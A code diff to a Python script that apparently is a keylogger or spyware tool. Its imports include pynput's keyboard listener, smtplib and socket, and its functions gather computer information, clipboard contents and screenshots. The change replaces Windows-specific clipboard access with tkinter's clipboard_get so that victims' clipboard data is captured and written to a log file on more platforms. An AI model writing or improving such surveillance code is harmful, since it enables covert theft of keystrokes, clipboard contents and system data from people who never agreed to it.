@@ -7,7 +7,7 @@ import smtplib
 from time import sleep
 import socket
 import platform
-import win32clipboard
+# import win32clipboard
 from pynput.keyboard import Key, Listener
 import time
 import os
@@ -18,6 +18,7 @@ from tkinter import Label, Frame, Entry, Button, messagebox, StringVar
 from customtkinter import CTk
 import logging
 from dotenv import load_dotenv
+import tkinter
 
 # Load environment variables
 load_dotenv()
@@ -92,13 +93,11 @@ def computer_information():
 def copy_clipboard():
     with open(clipboard_information, "a") as f:
         try:
-            win32clipboard.OpenClipboard()
-            pasted_data = win32clipboard.GetClipboardData()
-            win32clipboard.CloseClipboard()
-
+            r = tkinter.Tk()
+            r.withdraw()
+            pasted_data = r.clipboard_get()
             f.write("\nClipboard Data: \n" + pasted_data)
-
-        except:
+        except tkinter.TclError:
             f.write("\nClipboard could be not be copied")
 
 # Function to take screenshot
